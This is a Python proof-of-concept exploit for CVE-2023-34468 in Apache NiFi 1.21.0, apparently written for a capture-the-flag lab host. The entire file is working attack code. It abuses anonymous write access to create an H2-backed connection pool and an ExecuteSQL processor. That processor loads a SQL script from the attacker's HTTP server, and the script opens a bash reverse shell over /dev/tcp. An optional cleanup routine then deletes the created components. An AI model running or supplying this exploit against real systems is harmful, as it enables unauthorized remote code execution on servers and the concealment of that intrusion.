#!/usr/bin/env python3
"""
CVE-2023-34468 - Apache NiFi 1.21.0 RCE
Usage: python3 poc.py --target http://flow.helix.htb --lhost 10.10.15.189 --lport 4444
"""

import requests
import threading
import time
import sys
import argparse
from http.server import HTTPServer, BaseHTTPRequestHandler

requests.packages.urllib3.disable_warnings()

TARGET    = "http://flow.helix.htb"
LHOST     = "10.10.15.189"
LPORT     = 4444
HTTP_PORT = 80


def build_payload(lhost, lport):
    return f"""CREATE ALIAS IF NOT EXISTS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {{
    String[] command = {{"bash", "-c", cmd}};
    java.util.Scanner s = new java.util.Scanner(
        Runtime.getRuntime().exec(command).getInputStream()
    ).useDelimiter("\\\\A");
    return s.hasNext() ? s.next() : "";
}}
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1');"""


class SQLHandler(BaseHTTPRequestHandler):
    payload = ""
    def do_GET(self):
        if self.path == "/rce.sql":
            print("[+] rce.sql delivered to target")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(self.payload.encode())
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, format, *args):
        pass


def start_http_server(payload, port):
    SQLHandler.payload = payload
    HTTPServer(("0.0.0.0", port), SQLHandler).serve_forever()


class NiFiExploit:
    def __init__(self, target, lhost, http_port):
        self.target    = target.rstrip("/")
        self.lhost     = lhost
        self.http_port = http_port
        self.session   = requests.Session()
        self.session.verify = False
        self.headers   = {"Content-Type": "application/json"}
        self.cs_id     = None
        self.proc_id   = None
        self.pg_id     = None

    def _revision(self, url):
        return self.session.get(url).json()["revision"]["version"]

    def check_access(self):
        print("[*] Checking access...")
        try:
            self.session.get(f"{self.target}/nifi-api/access/config", timeout=10)
        except requests.exceptions.ConnectionError:
            print(f"[-] Cannot reach {self.target}")
            sys.exit(1)

        user = self.session.get(f"{self.target}/nifi-api/flow/current-user").json()
        print(f"[+] Identity: {user.get('identity')} | Anonymous: {user.get('anonymous')} | canWrite: {user.get('controllerPermissions',{}).get('canWrite')}")

        if not user.get("controllerPermissions", {}).get("canWrite"):
            print("[-] No write access — aborting")
            sys.exit(1)
        print("[+] Target is exploitable")

    def get_root_pg(self):
        print("[*] Getting root process group ID...")
        r = self.session.get(f"{self.target}/nifi-api/flow/process-groups/root").json()
        self.pg_id = r["processGroupFlow"]["id"]
        print(f"[+] PG ID: {self.pg_id}")

    def create_controller_service(self):
        print("[*] Creating DBCPConnectionPool...")
        body = {
            "revision": {"version": 0},
            "component": {
                "type": "org.apache.nifi.dbcp.DBCPConnectionPool",
                "name": "pwn_cs",
                "properties": {
                    "Database Connection URL": "jdbc:h2:mem:tempdb;TRACE_LEVEL_SYSTEM_OUT=3;",
                    "Database Driver Class Name": "org.h2.Driver",
                    "Database Driver Location(s)": "work/nar/extensions/nifi-poi-nar-1.21.0.nar-unpacked/NAR-INF/bundled-dependencies/h2-2.1.214.jar",
                },
            },
        }
        r = self.session.post(
            f"{self.target}/nifi-api/process-groups/{self.pg_id}/controller-services",
            headers=self.headers, json=body
        )
        if r.status_code not in (200, 201):
            print(f"[-] Failed: {r.status_code} {r.text}")
            sys.exit(1)
        self.cs_id = r.json()["id"]
        print(f"[+] CS ID: {self.cs_id}")

    def enable_controller_service(self):
        print("[*] Enabling controller service...")
        version = self._revision(f"{self.target}/nifi-api/controller-services/{self.cs_id}")
        r = self.session.put(
            f"{self.target}/nifi-api/controller-services/{self.cs_id}/run-status",
            headers=self.headers,
            json={"revision": {"version": version}, "state": "ENABLED"}
        )
        if r.status_code not in (200, 201):
            print(f"[-] Failed: {r.status_code} {r.text}")
            sys.exit(1)
        print("[+] Controller service enabled")
        time.sleep(2)

    def create_processor(self):
        print("[*] Creating ExecuteSQL processor...")
        body = {
            "revision": {"version": 0},
            "component": {
                "type": "org.apache.nifi.processors.standard.ExecuteSQL",
                "name": "pwn_exec",
                "position": {"x": 200, "y": 200},
                "config": {
                    "properties": {
                        "Database Connection Pooling Service": self.cs_id,
                        "SQL select query": f"RUNSCRIPT FROM 'http://{self.lhost}:{self.http_port}/rce.sql'",
                    },
                    "schedulingStrategy": "TIMER_DRIVEN",
                    "schedulingPeriod": "0 sec",
                    "autoTerminatedRelationships": ["failure", "success"],
                },
            },
        }
        r = self.session.post(
            f"{self.target}/nifi-api/process-groups/{self.pg_id}/processors",
            headers=self.headers, json=body
        )
        if r.status_code not in (200, 201):
            print(f"[-] Failed: {r.status_code} {r.text}")
            sys.exit(1)
        self.proc_id = r.json()["id"]
        print(f"[+] Processor ID: {self.proc_id}")

    def trigger(self):
        print("[*] Starting processor...")
        version = self._revision(f"{self.target}/nifi-api/processors/{self.proc_id}")
        r = self.session.put(
            f"{self.target}/nifi-api/processors/{self.proc_id}/run-status",
            headers=self.headers,
            json={"revision": {"version": version}, "state": "RUNNING"}
        )
        if r.status_code not in (200, 201):
            print(f"[-] Failed: {r.status_code} {r.text}")
            sys.exit(1)
        print(f"[+] Processor running — waiting for shell on port {LPORT}...")

    def cleanup(self):
        print("[*] Cleaning up...")
        if self.proc_id:
            url = f"{self.target}/nifi-api/processors/{self.proc_id}"
            v = self._revision(url)
            self.session.put(url + "/run-status", headers=self.headers,
                json={"revision": {"version": v}, "state": "STOPPED"})
            time.sleep(1)
            v = self._revision(url)
            self.session.delete(f"{url}?version={v}")
            print("[+] Processor deleted")

        if self.cs_id:
            url = f"{self.target}/nifi-api/controller-services/{self.cs_id}"
            v = self._revision(url)
            self.session.put(url + "/run-status", headers=self.headers,
                json={"revision": {"version": v}, "state": "DISABLED"})
            time.sleep(1)
            v = self._revision(url)
            self.session.delete(f"{url}?version={v}")
            print("[+] Controller service deleted")


def main():
    parser = argparse.ArgumentParser(description="CVE-2023-34468 NiFi RCE")
    parser.add_argument("--target",    default=TARGET)
    parser.add_argument("--lhost",     default=LHOST)
    parser.add_argument("--lport",     default=LPORT,     type=int)
    parser.add_argument("--http-port", default=HTTP_PORT, type=int)
    parser.add_argument("--cleanup",   action="store_true")
    args = parser.parse_args()

    print(f"[*] Target: {args.target} | LHOST: {args.lhost}:{args.lport} | HTTP: {args.http_port}")

    payload = build_payload(args.lhost, args.lport)
    threading.Thread(target=start_http_server, args=(payload, args.http_port), daemon=True).start()
    print(f"[*] HTTP server up on :{args.http_port}")

    exploit = NiFiExploit(args.target, args.lhost, args.http_port)

    try:
        exploit.check_access()
        exploit.get_root_pg()
        exploit.create_controller_service()
        exploit.enable_controller_service()
        exploit.create_processor()
        exploit.trigger()
        time.sleep(30)
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    finally:
        if args.cleanup:
            exploit.cleanup()


if __name__ == "__main__":
    main()
